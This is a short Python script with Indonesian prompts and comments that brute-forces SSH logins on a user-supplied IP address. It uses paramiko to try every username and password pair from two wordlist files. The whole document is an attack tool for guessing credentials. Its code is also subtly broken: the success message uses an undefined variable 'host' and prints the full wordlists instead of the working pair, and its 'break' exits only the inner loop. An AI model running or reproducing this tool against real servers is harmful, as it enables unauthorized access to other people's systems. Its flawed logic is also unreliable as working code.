import paramiko

target = input("Masukkan alamat ip target: ")
file_username = input("Masukkan nama file wordlist untuk username: ")

with open(file_username, 'r') as file_user:
    username = file_user.read().splitlines()

file_password = input("Masukkan nama file wordlist untuk password: ")

with open(file_password, 'r') as file_pass:
    password = file_pass.read().splitlines()

for u in username:
    for p in password:
        try:
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(target, username=u, password=p)
            print(f'Successful login to host {host} with username: {username} and password: {password}')

            # Tutup koneksi SSH
            ssh_client.close()
            break
        except paramiko.AuthenticationException:
            # Jika login gagal, lanjut ke kombinasi berikutnya
            continue
        except Exception as e:
            # Tangani kesalahan lainnya jika ada
            print(f"Terjadi kesalahan: {str(e)}")
